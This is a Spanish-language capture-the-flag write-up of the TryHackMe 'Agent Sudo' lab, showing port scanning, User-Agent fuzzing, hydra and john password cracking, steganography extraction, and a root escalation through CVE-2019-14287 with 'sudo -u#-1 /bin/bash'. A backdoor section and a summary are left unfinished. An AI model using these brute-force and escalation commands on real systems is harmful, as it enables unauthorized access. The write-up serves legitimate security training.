---
title: "TryHackMe | Agent Sudo"
published: 2025/05/30
slug: "tryhackme-agent-sudo"
image: "/writeups/tryhackme-agent-sudo/thumbnail.png"
---

<img src="/writeups/tryhackme-agent-sudo/thumbnail.png" width=200px heigh=200px/>

<https://tryhackme.com/room/agentsudoctf>

## Escaneo

Escaneamos todos los 65535 puertos TCP de la maquina objetivo con **Nmap**.

```bash
sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>nmap:</b> Herramienta para escanear puertos.</li>
        <li><b>-p-:</b> Escanear todos los puertos.</li>
        <li><b>-n:</b/> No realizar resolución DNS.</li>
        <li><b>-Pn:</b/> Asumir que el <i>host</i> esta en linea para evitar que Nmap intente primero descubrirlo.</li>
        <li><b>-T4:</b> Usar plantilla de temporizado 4 ("aggresive"). Esto no es necesario y podemos optar por usar la plantilla por defecto "normal" (-T3).</li>
        <li><b>-oN [archivo]:</b> Escribir resultados en formato "normal" en el archivo indicado.</li>
</ul>
</details>


```text
sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt

# Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209
Nmap scan report for 10.10.195.209
Host is up (0.27s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Descubrimos el puerto ``21`` para ``FTP``, puerto ``22`` para ``SSH`` y puerto ``80`` para ``HTTP``. Obtenemos información de los puertos abiertos.

```bash
sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>nmap:</b> Herramienta para escanear puertos.</li>
        <li><b>-sCV:</b> Usar <i>scripts</i> por defecto (-sC) y realizar escaneo de versiones (-sV).</li>
        <li><b>-n:</b/> No realizar resolución DNS.</li>
        <li><b>-Pn:</b/> Asumir que el <i>host</i> esta en linea para evitar que Nmap intente primero descubrirlo.</li>
        <li><b>-T4:</b> Usar plantilla de temporizado 4 ("aggresive"). Esto no es necesario y podemos optar por usar la plantilla por defecto "normal" (-T3).</li>
        <li><b>-oN [archivo]:</b> Escribir resultados en formato "normal" en el archivo indicado.</li>
</ul>
</details>

```text
sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt

# Nmap 7.95 scan initiated Fri May 30 16:25:00 2025 as: /usr/lib/nmap/nmap -sCV -p 21,22,80 -n -Pn -T4 -oN nmap-ports.txt 10.10.195.209
Nmap scan report for 10.10.195.209
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

> Para agilizar el proceso de escaneo y enumeración, primero encontramos puertos abiertos y luego los escaneamos en busca de banners, versiones y otra información util.

## Enumeración de servicios

### TCP/21

No es posible realizar un inicio de sesión anónimo en el servicio ``FTP``. Por lo que tendremos que revisitar este puerto mas adelante.

### TCP/80

Al ingresar a la pagina web, se nos da la bienvenida con un mensaje críptico.

![image-1](/writeups/tryhackme-agent-sudo/image-1.png)

"user-agent" se refiere a la cabecera HTTP ``User-Agent``, por lo que debemos de cambiarla para poder acceder. ¿Pero que "código nombre" debemos utilizar? Puesto que el mensaje fue firmado por ``Agent R``, podemos intuir que nuestro código nombre corresponde a alguna de las letras del abecedario.

Creamos una lista de palabras con todas las letras del abecedario en mayúscula haciendo uso de **TTPassGen**.

```bash
ttpassgen -r "[?u]{1:1}" wordlist.txt
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>ttpassgen:</b> Generador de listas de palabras altamente flexible escrito en Python.</li>
        <li><b>-r [regla]:</b>Regla a usar (consultar el repositorio de GitHub para mayor información).</li>
</ul>
</details>

```text [wordlist.txt]
A
B
C
[...]
Y
Z
```

Enviamos solicitudes con **ffuf**. Puesto que la lista de palabras es corta, y no sabemos exactamente que esperar de una respuesta adecuada, podemos optar por no filtrar las respuestas y examinarlas manualmente. Sin embargo, también podemos suponer que una respuesta adecuada contendrá un código de respuesta diferente a ``200 OK`` o tendrá un tamaño diferente al usual de 218 bytes.

Para propósitos educativos, elegiremos seguir las redirecciones y filtrar las respuestas basadas en su tamaño.

```bash
ffuf -u http://10.10.195.209 -H "User-Agent: FUZZ" -w wordlist.txt -c -r -fs 218
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>ffuf:</b> <i>Fuzzer</i> web escrito en Go.</li>
        <li><b>-u [url]:</b> URL objetivo.</li>
        <li><b>-H [cabecera]:</b> Cabecera "Nombre: Valor".</li>
        <li><b>-w [lista de palabras]:</b> Ruta del archivo con la lista de palabras.</li>
        <li><b>-c:</b> Colorear la salida (permite distinguir mejor las respuestas por sus códigos).</li>
        <li><b>-r:</b> Seguir redirecciones.</li>
        <li><b>-fs [tamaño]:</b> Filtrar respuestas HTTP por tamaño.</li>
</ul>
</details>

> ¿Filtrar por código de respuesta o por tamaño? Filtrar por código de respuesta nos puede llevar a omitir respuestas no estándares, por lo que seguiremos la redirecciones y filtraremos por tamaño de respuesta.

```text
ffuf -u http://10.10.195.209 -H "User-Agent: FUZZ" -w wordlist.txt -c -r -fs 218

[...]
R                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]
C                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]
```

> La letra C originalmente nos redirige a otra pagina, mientras que la letra R nos muestra otro mensaje. Si hubiéramos filtrado todas las respuestas con código 200, hubiéramos omitido esta ultima respuesta.

El User-Agent R y C retornan respuestas diferentes a la estándar. Al enviar una petición con la cabecera ``User-Agent: R``, obtenemos una respuesta ligeramente diferente a la original (pero sin importancia). La cabecera ``User-Agent: C`` nos revela una respuesta completamente diferente.

```bash
curl -sL -H "User-Agent: C" http://10.10.195.209/
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>curl:</b> Herramienta para transferir datos desde o hacia un servidor usando URLs.</li>
        <li><b>-sL:</b> No mostrar barra de progreso (-s) y seguir redirecciones (-L).</li>
        <li><b>-H [cabecera]:</b> Cabecera "Nombre: Valor".</li>
</ul>
</details>

```text
curl -sL -H "User-Agent: C" http://10.10.195.209/

Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```

Descubrimos el nombre de usuario ``chris`` y que su contraseña es débil.

Si intentamos enumerar directorios y paginas web, tales como formularios de inicio de sesión, no obtendremos resultados.

## Explotación

### ¿SSH?

Al no encontrar un vector de explotación evidente, usaremos **hydra** para obtener la contraseña del servicio ``SSH`` mediante fuerza bruta.

Iniciar sesión en este servicio corresponde al camino hacia el éxito mas directo, por tanto tiene sentido probar un ataque de fuerza bruta primero con este servicio. Pero en un entorno real este servicio estará fuertemente protegido y monitorizado, por lo que deberíamos de probar en otros lugares primero.

Finalmente, este ataque falla en obtener una contraseña valida en un intervalo de tiempo aceptable.

> Nunca debes realizar un ataque de fuerza bruta, a menos que sea el único camino disponible o hayan grandes indicios de que este es el camino correcto.

### FTP

Al fallar el anterior ataque, esta vez lo intentaremos en el servicio ``FTP``, haciendo uso de la famosa lista de palabras ``rockyou.txt``.

> Si hay indicios de que una contraseña es débil, vale la pena usar listas de palabras conocidas como rockyou.txt (solo en CTFs).

```bash
hydra -l "chris" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>hydra:</b> <i>Cracker</i> de inicios de sesión paralelos que soporta numerosos protocolos.</li>
        <li><b>-l [usuario]:</b> Nombre de usuario a iniciar sesión.</li>
        <li><b>-P: [lista de palabras]</b> Ruta del archivo con contraseñas a probar.</li>
        <li><b>-f:</b> Parar después del primer inicio de sesión valido.</li>
        <li><b>-vV:</b> Salida muy verbal.</li>
</ul>
</details>

```text
hydra -l "chris" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp

[...]
[21][ftp] host: 10.10.195.209   login: chris   password: crystal
[STATUS] attack finished for 10.10.195.209 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43
```

Obtenemos la contraseña ``crystal``. Ingresamos al servidor ``FTP`` con estas credenciales y listamos los archivos.

```text
ftp> ls
229 Entering Extended Passive Mode (|||6987|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```

El servidor ``FTP`` contiene tres archivos: Dos imágenes y un archivo de texto. Los descargamos de forma recursiva.

```text
ftp> prompt
Interactive mode off.
ftp> mget .
local: To_agentJ.txt remote: To_agentJ.txt
[...]
local: cute-alien.jpg remote: cute-alien.jpg
[...]
local: cutie.png remote: cutie.png
[...]
```

> Usamos el comando *promt* para evitar tener que confirmar manualmente la descarga de cada archivo.

A simple vista, no hay nada fuera de lo usual en las imágenes descargadas. El archivo ``To_agentJ.txt`` contiene el siguiente mensaje.

```text [To_agentJ.txt]
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

### Esteganografía

Según el mensaje anterior, una de las imágenes contiene la contraseña de Agent R. Debemos realizar estegoanálisis en busca de un mensaje escondido. Podemos realizar este proceso con muchas herramientas, pero en CTFs usualmente podremos obtener información oculta haciendo uso de *exiftool*, *strings*, *binwalk* y *steghide* (no esperes hacer uso de estas herramientas en pruebas de penetración reales).

La herramienta *exiftool* no revela nada importante en ambas imágenes. Pero **strings** revela algo en la imagen `cutie.png`.

```bash
strings cutie.png | head -n 20 && echo "....." && strings cutie.png | tail -n 20
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>strings:</b> Mostrar cadenas de texto legibles para humanos.</li>
        <li><b>head:</b> Mostrar las primeras 10 lineas de un archivo.</li>
        <li><b>-n [numero]:</b> Mostrar las primeras lineas.</li>
        <li><b>tail:</b> Mostrar las ultimas 10 lineas de un archivo.</li>
        <li><b>-n [numero]:</b> Mostrar las ultimas lineas.</li>
</ul>
</details>

```text
strings cutie.png | head -n 20 && echo "....." && strings cutie.png | tail -n 20

[...]
To_agentR.txt
W\_z#
2a>=
To_agentR.txt
EwwT
```

Descubrimos que ``cutie.png`` contiene un archivo de texto incrustado. Para extraerlo hacemos uso de **binwalk**.

```bash
binwalk -e cutie.png
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>binwalk:</b> Buscar archivos incrustados en binarios.</li>
        <li><b>-e:</b> Extraer automáticamente tipos de archivos conocidos (requiere de las herramientas adecuadas instaladas).</li>
</ul>
</details>

```text
binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
```

Los archivos fueron extraídos en la carpeta ``_cutie.png.extracted``. Dentro de esta carpeta encontramos el archivo ``8702.zip`` que no pudo ser extraído automáticamente. Sin embargo *unzip* falla en extraer este archivo, por lo que debemos de usar **7zip**.

```bash
7zip x 8702.zip
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>7zip:</b> Software para comprimir y descomprimir archivos.</li>
        <li><b>x:</b> Extraer archivo.</li>
</ul>
</details>

### Crackeo de zip

El archivo ``8702.zip`` esta protegido por una contraseña. Para *crackearla*, primero debemos debemos de convertir el archivo ZIP en un formato adecuado para *john* haciendo uso de **zip2john**.

```bash
zip2john 8702.zip > zip2john.txt
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>zip2john [archivo]:</b> Convertir archivo ZIP en un formato adecuado para <i>john</i>.</li>
</ul>
</details>

*Crackeamos* la contraseña con **john** haciendo uso del archivo ``zip2john.txt`` generado anteriormente y la lista de palabras ``rockyou.txt``.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>john:</b> Recuperador de contraseñas.</li>
        <li><b>--wordlist [lista de palabras]:</b> Lista de palabras a usar.</li>
</ul>
</details>

```text
john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt

[...]
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Encontramos que la contraseña para descomprimir el archivo es ``alien``. Al descomprimir el archivo ZIP obtenemos el archivo de texto ``To_agentR.txt`` el cual contiene el siguiente mensaje.

```text [_cutie.png.extracted/To_agentR.txt]
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

A simple vista esto no parece sernos de utilidad, pero la cadena de texto ``QXJlYTUx`` puede estar codificada. Ingresamos esta cadena de texto en [CyberChef](https://cyberchef.io/). La pagina automáticamente reconoce que esta cadena de texto esta codificada en Base64. Al decodificarla obtenemos la frase ``Area51``.

¿Obtuvimos la contraseña de SSH? Resulta no ser valida. Si esta imagen contiene un archivo incrustado, probablemente la otra imagen también.

**strings** revela que la imagen ``cute-alien.png`` contiene información adicional incrustada.

```bash
strings cute-alien.png | head -n 20 && echo "....." && strings cute-alien.png | tail -n 20
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>strings:</b> Mostrar cadenas de texto legibles para humanos.</li>
        <li><b>head:</b> Mostrar las primeras 10 lineas de un archivo.</li>
        <li><b>-n [numero]:</b> Mostrar las primeras lineas.</li>
        <li><b>tail:</b> Mostrar las ultimas 10 lineas de un archivo.</li>
        <li><b>-n [numero]:</b> Mostrar las ultimas lineas.</li>
</ul>
</details>

```text
strings cute-alien.png | head -n 20 && echo "....." && strings cute-alien.png | tail -n 20

JFIF
 , #&')*)
-0-(0%()(
((((((((((((((((((((((((((((((((((((((((((((((((((
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
        #3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
~U,q
.c@6
[...]
```

> Nota las cadenas de caracteres inusuales en las primeras lineas de la salida. Definitivamente hay información adicional incrustada en la imagen. Compara la salida de *strings* anterior con el de una imagen normal.

*binwalk* no revela archivos incrustados. Es posible que la información adicional haya sido incrustada mediante métodos de esteganografía.

¿Recuerdas la frase anterior? Si se hizo uso de esteganografía para ocultar información, esta habrá sido ocultada con la ayuda de una frase secreta. Es posible que esta sea la frase usada. Para extraer esta información haremos uso de **steghide**.

```bash
steghide extract -sf cute-alien.jpg -p "Area51"
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>steghide:</b> Herramienta de esteganografía.</li>
        <li><b>extract:</b> Extraer datos ocultos de un archivo.</li>
        <li><b>-sf [archivo]:</b> Especificar el nombre del archivo.</li>
        <li><b>-p [frase]:</b> Usar la frase secreta.</li>
</ul>
</details>

```text
steghide extract -sf cute-alien.jpg -p "Area51"

wrote extracted data to "message.txt".
```

> Alternativamente, si no conocemos la frase secreta para extraer información de un archivo de esteganografía, podemos hacer uso de *stegseek* para *crackearla* haciendo uso de una lista de palabras.

La información fue extraída en el archivo ``message.txt``.

```text [message.txt]
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

### SSH

Descubrimos el usuario ``james`` y su contraseña ``hackerrules!``. Usamos estas credenciales para ingresar al servidor SSH.

Dentro de la carpeta *home* de nuestro usuario encontraremos la bandera del usuario y la imagen ``Alien_autospy.jpg`` que contiene la respuesta a la pregunta "What is the incident of the photo called?". Para copiar la imagen a nuestra maquina local puedes usar el comando ``scp james@10.10.195.209/Alien_autospy.jpg .`` en una nueva terminal y luego ingresar la contraseña de *james*.

## Escalada de privilegios

Enumeramos el usuario actual. Una de las primeras cosas que debemos hacer en CTFs cuando obtenemos un *foothold* en la maquina objetivo es ingresar el comando ``sudo -ll`` (en este caso deberemos usar ``sudo -l`` por razones que explicare mas adelante).

```text
james@agent-sudo:~$ sudo -l

[sudo] password for james: hackerrules!
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>sudo:</b> Ejecutar comandos como otro usuario.</li>
        <li><b>-l:</b> Listar los privilegios del usuario invocador (si no se especifica con la opción -U).</li>
</ul>
</details>

> Aunque la salida del comando ``sudo -ll`` tiene un formato mas legible que ``sudo -l``, la linea ``(ALL, !root) /bin/bash`` sera clave para identificar la vulnerabilidad.

La salida del comando anterior puede resultar poco clara, pero esta nos informa que el usuario ``james`` puede ejecutar el comando ``/bin/bash`` como cualquier usuario excepto ``root``. Parece seguro ¿No? En realidad existe un CVE especifico para esta situación que nos permitirá escalar nuestros privilegios a root.

Para identificar esta vulnerabilidad podemos buscar la frase ``(ALL, !root) /bin/bash`` (¿No te parece inusual o demasiado especifica?) en el motor de búsqueda de tu preferencia y se nos apuntara al CVE-2019-14287. Todas las versiones de Sudo anteriores a 1.8.28 presentan una falla en la ejecución de comandos con un User ID (UID) arbitrario.  Alternativamente, podemos usar herramientas de enumeración como ``linpeas`` o ``LinEnum`` para identificar que la versión de sudo es vulnerable a este CVE.

Podemos comprobar que la versión de sudo presente en la maquina objetivo es vulnerable a este CVE.

```text
james@agent-sudo:~$ sudo --version

Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Para explicar mejor esta vulnerabilidad, es necesario saber que el usuario root siempre tendrá un UID de 0 y que un usuario en Linux también puede ser referenciado directamente haciendo uso de su UID. Por ejemplo, tanto el comando ``id root`` como ``id 0`` mostraran los identificadores del usuario root. En el caso del comando ``sudo``, la opción ``-u`` (usada para ejecutar un comando como otro usuario) admite UIDs haciendo uso del formato ``#uid``. De esta forma podríamos ejecutar un comando como root haciendo uso de ``sudo -u#0 [comando]``.

La vulnerabilidad reside en el hecho de que un UID . Esta falla solo afecta a configuraciones de sudo donde alguna entrada en el archivo sudoers permite ejecutar un comando como cualquier usuario excepto root.

```bash
sudo -u#-1 /bin/bash
```

<details>
<summary>Explicación del comando</summary>
<ul>
        <li><b>sudo:</b> Ejecutar comandos como otro usuario.</li>
        <li><b>-u [usuario]:</b> Ejectuar el comando como el usuario especificado.</li>
</ul>
</details>

```text
james@agent-sudo:~$ sudo -u#-1 /bin/bash

root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
```

Dentro de la carpeta ``/root`` encontraremos la bandera de root y la respuesta a la pregunta bonus.

## Persistencia

Ahora que hemos escalado privilegios a ``root``, deberiamos de crear un *backdoor* para asegurar la persistencia del ingreso a una cuenta con altos privilegios en esta maquina. Existen distintas formas para crear un *backdoor* que nos permita acceder directamente al usuario ``root``, pero teniendo en cuenta que muchas de ellas requieren de la posterior interacción de esta cuenta (como iniciar sesión) por parte de otra persona, 

## Resumen ejecutivo

Descripción

## Remediación

1. Evita el uso de contraseñas débiles.
2. Actualiza ``sudo`` a la ultima versión disponible haciendo uso del gestor de paquetes de tu sistema operativo.

## Conclusiones

Este es un desafio relativamente facil. Introduce a los principiantes a la enumeración basica de servicios de red, ataques de fuerza bruta, *crackeo* de contraseñas y metodos basicos de ingenieria inversa. La parte mas complicada es descubrir la pagina oculta haciendo uso de un metodo muy inusual, y realizar esteganografía a las imagenes descargadas (y saber que esto se debe realizar en primer lugar).

Eventualmente tenemos la oportunidad de explotar el CVE-2019-14287, que aunque pueda resultar peligroso debido a la posibilidad de escalar privilegios con un unico comando, requiere de entradas muy especificas en el archivo sudoers y de una versión de sudo del 2019 (el cual se puede actualizar facilmente con el gestor de paquetes del sistema operativo). Por supuesto, el desafio fue creado poco despues de la divulgación del CVE, pero en un contexto actual esta vulnerabilidad es muy poco probable que este presente.
